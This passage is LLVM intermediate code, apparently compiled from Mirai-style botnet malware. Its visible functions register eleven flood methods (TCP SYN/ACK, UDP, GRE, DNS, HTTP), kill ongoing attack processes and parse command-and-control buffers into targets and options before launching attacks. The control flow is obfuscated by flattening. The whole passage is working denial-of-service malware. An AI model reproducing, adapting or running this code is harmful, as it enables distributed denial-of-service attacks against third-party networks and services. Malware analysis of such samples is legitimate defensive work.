x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.204, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.231, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.232, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.233, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.234, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.235, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.241, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.255, i32 0, i32 0)], align 16

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcp)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_stdhex)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greip)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_greeth)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udprandom)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpsyn)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstorm)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_udp_dns)
  call void @add_attack(i8 zeroext 11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_app_http)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #6
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = add nsw i32 %17, 1
  %19 = sext i32 %18 to i64
  %20 = mul i64 %19, 8
  %21 = call i8* @realloc(i8* %15, i64 %20) #6
  %22 = bitcast i8* %21 to %struct.attack_method**
  store %struct.attack_method** %22, %struct.attack_method*** @methods, align 8
  %23 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %24 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %25 = load i8, i8* @methods_len, align 1
  %26 = add i8 %25, 1
  store i8 %26, i8* @methods_len, align 1
  %27 = zext i8 %25 to i64
  %28 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %24, i64 %27
  store %struct.attack_method* %23, %struct.attack_method** %28, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %switchVar = alloca i32
  store i32 1700319561, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1700319561, label %2
    i32 -2025579143, label %6
    i32 965142852, label %13
    i32 -1991487848, label %19
    i32 -1112664204, label %23
    i32 -27710490, label %26
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:2:                                      ; preds = %loopEntry
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 15
  %5 = select i1 %4, i32 -2025579143, i32 -27710490
  store i32 %5, i32* %switchVar
  br label %loopEnd

; <label>:6:                                      ; preds = %loopEntry
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp ne i32 %10, 0
  %12 = select i1 %11, i32 965142852, i32 -1991487848
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %1, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @kill(i32 %17, i32 9) #6
  store i32 -1991487848, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %1, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [15 x i32], [15 x i32]* @attack_ongoing, i64 0, i64 %21
  store i32 0, i32* %22, align 4
  store i32 -1112664204, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i32, i32* %1, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %1, align 4
  store i32 1700319561, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %23, %19, %13, %6, %2, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %.reg2mem = alloca i64
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  store i64 %14, i64* %.reg2mem
  %switchVar = alloca i32
  store i32 -1688010115, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1688010115, label %first
    i32 1162896022, label %17
    i32 2044839338, label %18
    i32 -498482786, label %32
    i32 1746046404, label %33
    i32 1073980008, label %44
    i32 850844816, label %45
    i32 860461912, label %57
    i32 -1845972743, label %58
    i32 1728538130, label %66
    i32 -1507964730, label %67
    i32 1088403326, label %72
    i32 1490051453, label %78
    i32 -1892497670, label %120
    i32 583294834, label %123
    i32 -1539230406, label %128
    i32 -1764678452, label %129
    i32 940184645, label %141
    i32 -1851871220, label %146
    i32 -333566399, label %152
    i32 -1277887257, label %157
    i32 -1301523923, label %158
    i32 -1146940751, label %175
    i32 1318794120, label %176
    i32 -1172746657, label %189
    i32 -581475733, label %190
    i32 1554068856, label %219
    i32 975167751, label %222
    i32 -721163002, label %223
    i32 -2057351232, label %231
    i32 -1919285393, label %235
    i32 -1838459027, label %238
    i32 -278804474, label %242
    i32 874158574, label %246
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i64, i64* %.reg2mem
  %15 = icmp ult i64 %.reload, 4
  %16 = select i1 %15, i32 1162896022, i32 2044839338
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %3, align 8
  %20 = bitcast i8* %19 to i32*
  %21 = load i32, i32* %20, align 4
  %22 = call i32 @ntohl(i32 %21) #7
  store i32 %22, i32* %6, align 4
  %23 = load i8*, i8** %3, align 8
  %24 = getelementptr inbounds i8, i8* %23, i64 4
  store i8* %24, i8** %3, align 8
  %25 = load i32, i32* %4, align 4
  %26 = sext i32 %25 to i64
  %27 = sub i64 %26, 4
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* %4, align 4
  %29 = load i32, i32* %4, align 4
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -498482786, i32 1746046404
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %3, align 8
  %35 = getelementptr inbounds i8, i8* %34, i32 1
  store i8* %35, i8** %3, align 8
  %36 = load i8, i8* %34, align 1
  store i8 %36, i8* %7, align 1
  %37 = load i32, i32* %4, align 4
  %38 = sext i32 %37 to i64
  %39 = sub i64 %38, 1
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %4, align 4
  %41 = load i32, i32* %4, align 4
  %42 = icmp eq i32 %41, 0
  %43 = select i1 %42, i32 1073980008, i32 850844816
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i8*, i8** %3, align 8
  %47 = getelementptr inbounds i8, i8* %46, i32 1
  store i8* %47, i8** %3, align 8
  %48 = load i8, i8* %46, align 1
  store i8 %48, i8* %8, align 1
  %49 = load i32, i32* %4, align 4
  %50 = sext i32 %49 to i64
  %51 = sub i64 %50, 1
  %52 = trunc i64 %51 to i32
  store i32 %52, i32* %4, align 4
  %53 = load i8, i8* %8, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 0
  %56 = select i1 %55, i32 860461912, i32 -1845972743
  store i32 %56, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %4, align 4
  %60 = sext i32 %59 to i64
  %61 = load i8, i8* %8, align 1
  %62 = zext i8 %61 to i64
  %63 = mul i64 5, %62
  %64 = icmp ult i64 %60, %63
  %65 = select i1 %64, i32 1728538130, i32 -1507964730
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i8, i8* %8, align 1
  %69 = zext i8 %68 to i64
  %70 = call noalias i8* @calloc(i64 %69, i64 24) #6
  %71 = bitcast i8* %70 to %struct.attack_target*
  store %struct.attack_target* %71, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  store i32 1088403326, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i32, i32* %5, align 4
  %74 = load i8, i8* %8, align 1
  %75 = zext i8 %74 to i32
  %76 = icmp slt i32 %73, %75
  %77 = select i1 %76, i32 1490051453, i32 583294834
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i8*, i8** %3, align 8
  %80 = bitcast i8* %79 to i32*
  %81 = load i32, i32* %80, align 4
  %82 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %82, i64 %84
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i32 0, i32 1
  store i32 %81, i32* %86, align 4
  %87 = load i8*, i8** %3, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 4
  store i8* %88, i8** %3, align 8
  %89 = load i8*, i8** %3, align 8
  %90 = getelementptr inbounds i8, i8* %89, i32 1
  store i8* %90, i8** %3, align 8
  %91 = load i8, i8* %89, align 1
  %92 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %92, i64 %94
  %96 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i32 0, i32 2
  store i8 %91, i8* %96, align 4
  %97 = load i32, i32* %4, align 4
  %98 = sext i32 %97 to i64
  %99 = sub i64 %98, 5
  %100 = trunc i64 %99 to i32
  store i32 %100, i32* %4, align 4
  %101 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %102 = load i32, i32* %5, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %101, i64 %103
  %105 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %104, i32 0, i32 0
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 0
  store i16 2, i16* %106, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 1
  %112 = load i32, i32* %111, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 0
  %118 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %117, i32 0, i32 2
  %119 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %118, i32 0, i32 0
  store i32 %112, i32* %119, align 4
  store i32 -1892497670, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %5, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %5, align 4
  store i32 1088403326, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %4, align 4
  %125 = sext i32 %124 to i64
  %126 = icmp ult i64 %125, 1
  %127 = select i1 %126, i32 -1539230406, i32 -1764678452
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  %130 = load i8*, i8** %3, align 8
  %131 = getelementptr inbounds i8, i8* %130, i32 1
  store i8* %131, i8** %3, align 8
  %132 = load i8, i8* %130, align 1
  store i8 %132, i8* %9, align 1
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = sub i64 %134, 1
  %136 = trunc i64 %135 to i32
  store i32 %136, i32* %4, align 4
  %137 = load i8, i8* %9, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp sgt i32 %138, 0
  %140 = select i1 %139, i32 940184645, i32 -721163002
  store i32 %140, i32* %switchVar
  br label %loopEnd

; <label>:141:                                    ; preds = %loopEntry
  %142 = load i8, i8* %9, align 1
  %143 = zext i8 %142 to i64
  %144 = call noalias i8* @calloc(i64 %143, i64 16) #6
  %145 = bitcast i8* %144 to %struct.attack_option*
  store %struct.attack_option* %145, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  store i32 -1851871220, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %5, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp slt i32 %147, %149
  %151 = select i1 %150, i32 -333566399, i32 975167751
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  %153 = load i32, i32* %4, align 4
  %154 = sext i32 %153 to i64
  %155 = icmp ult i64 %154, 1
  %156 = select i1 %155, i32 -1277887257, i32 -1301523923
  store i32 %156, i32* %switchVar
  br label %loopEnd

; <label>:157:                                    ; preds = %loopEntry
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
  %159 = load i8*, i8** %3, align 8
  %160 = getelementptr inbounds i8, i8* %159, i32 1
  store i8* %160, i8** %3, align 8
  %161 = load i8, i8* %159, align 1
  %162 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %163 = load i32, i32* %5, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %165, i32 0, i32 1
  store i8 %161, i8* %166, align 8
  %167 = load i32, i32* %4, align 4
  %168 = sext i32 %167 to i64
  %169 = sub i64 %168, 1
  %170 = trunc i64 %169 to i32
  store i32 %170, i32* %4, align 4
  %171 = load i32, i32* %4, align 4
  %172 = sext i32 %171 to i64
  %173 = icmp ult i64 %172, 1
  %174 = select i1 %173, i32 -1146940751, i32 1318794120
  store i32 %174, i32* %switchVar
  br label %loopEnd

; <label>:175:                                    ; preds = %loopEntry
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:176:                                    ; preds = %loopEntry
  %177 = load i8*, i8** %3, align 8
  %178 = getelementptr inbounds i8, i8* %177, i32 1
  store i8* %178, i8** %3, align 8
  %179 = load i8, i8* %177, align 1
  store i8 %179, i8* %12, align 1
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = sub i64 %181, 1
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* %4, align 4
  %185 = load i8, i8* %12, align 1
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %184, %186
  %188 = select i1 %187, i32 -1172746657, i32 -581475733
  store i32 %188, i32* %switchVar
  br label %loopEnd

; <label>:189:                                    ; preds = %loopEntry
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  %191 = load i8, i8* %12, align 1
  %192 = zext i8 %191 to i32
  %193 = add nsw i32 %192, 1
  %194 = sext i32 %193 to i64
  %195 = call noalias i8* @calloc(i64 %194, i64 1) #6
  %196 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %197 = load i32, i32* %5, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %196, i64 %198
  %200 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %199, i32 0, i32 0
  store i8* %195, i8** %200, align 8
  %201 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %202 = load i32, i32* %5, align 4
  %203 = sext i32 %202 to i64
  %204 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %201, i64 %203
  %205 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %204, i32 0, i32 0
  %206 = load i8*, i8** %205, align 8
  %207 = load i8*, i8** %3, align 8
  %208 = load i8, i8* %12, align 1
  %209 = zext i8 %208 to i32
  call void @util_memcpy(i8* %206, i8* %207, i32 %209)
  %210 = load i8, i8* %12, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8*, i8** %3, align 8
  %213 = sext i32 %211 to i64
  %214 = getelementptr inbounds i8, i8* %212, i64 %213
  store i8* %214, i8** %3, align 8
  %215 = load i8, i8* %12, align 1
  %216 = zext i8 %215 to i32
  %217 = load i32, i32* %4, align 4
  %218 = sub nsw i32 %217, %216
  store i32 %218, i32* %4, align 4
  store i32 1554068856, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %5, align 4
  %221 = add nsw i32 %220, 1
  store i32 %221, i32* %5, align 4
  store i32 -1851871220, i32* %switchVar
  br label %loopEnd

; <label>:222:                                    ; preds = %loopEntry
  store i32 -721163002, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call i32* @__errno_location() #7
  store i32 0, i32* %224, align 4
  %225 = load i32, i32* %6, align 4
  %226 = load i8, i8* %7, align 1
  %227 = load i8, i8* %8, align 1
  %228 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %229 = load i8, i8* %9, align 1
  %230 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %225, i8 zeroext %226, i8 zeroext %227, %struct.attack_target* %228, i8 zeroext %229, %struct.attack_option* %230)
  store i32 -2057351232, i32* %switchVar
  br label %loopEnd

; <label>:231:                                    ; preds = %loopEntry
  %232 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %233 = icmp ne %struct.attack_target* %232, null
  %234 = select i1 %233, i32 -1919285393, i32 -1838459027
  store i32 %234, i32* %switchVar
  br label %loopEnd

